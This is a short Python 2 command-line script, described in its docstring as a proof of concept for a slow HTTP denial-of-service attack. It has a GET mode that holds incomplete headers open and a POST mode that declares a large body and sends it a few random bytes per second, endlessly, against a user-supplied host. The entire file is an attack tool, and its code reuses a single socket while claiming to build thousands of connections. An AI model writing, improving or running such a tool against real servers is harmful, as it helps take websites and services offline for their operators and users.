#!/usr/bin/env python

'''
    a POC of http post LDOS
'''

import optparse
import socket
import time
import random
import sys

def randomMsg():
    randstr=['a','b','c','d','e','f','g','1','2','3']
    rand=random.random()
    rand=10*rand
    rand=int(round(rand,0))
    mystr=''
    for i in range(rand):
        mystr=mystr+randstr[i]

    return mystr
    
def httpGetDos(target,maxconnections):
    host=target
    port=80
        
    client=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    try:
        client.connect((host,port))
    except:
        print 'connect failed'

    clients=[]
    max_connections=maxconnections
    header="GET /a HTTP/1.1\r\n"+\
            "HOST: "+host+"\r\n"+\
            "Connection: keep-alive\r\n"+\
            "Keep-Alive: 1000\r\n";
    
    #bulid connections
    for i in range(max_connections):
        try:
            client.send(header)
            print 'send header'+str(i)+' times successfully'
            clients.append(client)
        except:
            print 'send header'+str(i)+' times failed'

    for i in range(len(clients)):
        sleep_time=100*random.random()
        time.sleep(sleep_time)
        try:
            client.send('\r\n')
            print "connection %d finished" % i
        except:
            continue
    


def httpPostDos(target,maxconnections):
    ''' main test procedures '''

    host=target
    port=80
        
    client=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    try:
        client.connect((host,port))
    except:
        print 'connect failed'

    clients=[]
    max_connections=maxconnections
    header="POST /a HTTP/1.1\r\n"+\
            "HOST: "+host+"\r\n"+\
            "Connection: keep-alive\r\n"+\
            "Keep-Alive: 900\r\n"+\
            "Content-Length: 100000\r\n";
    
    #bulid connections
    for i in range(max_connections):
        try:
            client.send(header)
            print 'send header'+str(i)+' times successfully'
            clients.append(client)
        except:
            print 'send header'+str(i)+' times failed'


    #keep connections alive
    while True:
        for i in range(len(clients)):
            try:
                clients[i].send(randomMsg())
                print "client "+str(i)+" sends data successfully"
            except:
                print "client "+str(i)+" sends data failed"
        time.sleep(1)


def main():

    parser=optparse.OptionParser("usage ./ldos [options] <host>")
    parser.add_option("-t","--type",\
                      dest="attack_type",\
                      help="the attack mode,p is postdos,g is getdos",\
                      type="string",\
                      default="p")
    parser.add_option("-n","--number",\
                      dest="connections",help="set the max connections",\
                      type="int",default=2000)
    (options,args)=parser.parse_args()
    if(len(args)!=1):
        print parser.print_help()
        sys.exit(1)
    else:
        target=args[0]

    attack_type=options.attack_type
    maxconnections=options.connections
    
    if attack_type != None:
        if attack_type=="p":
            print "Post ldos start"
            httpPostDos(target,maxconnections)
        elif attack_type=="g":
            print "Get ldos start"
            httpGetDos(target,maxconnections)
        else:
            print "Unknow attack mode"
            sys.exit(1)
            
        

if __name__=="__main__":
    main()














    
    
    
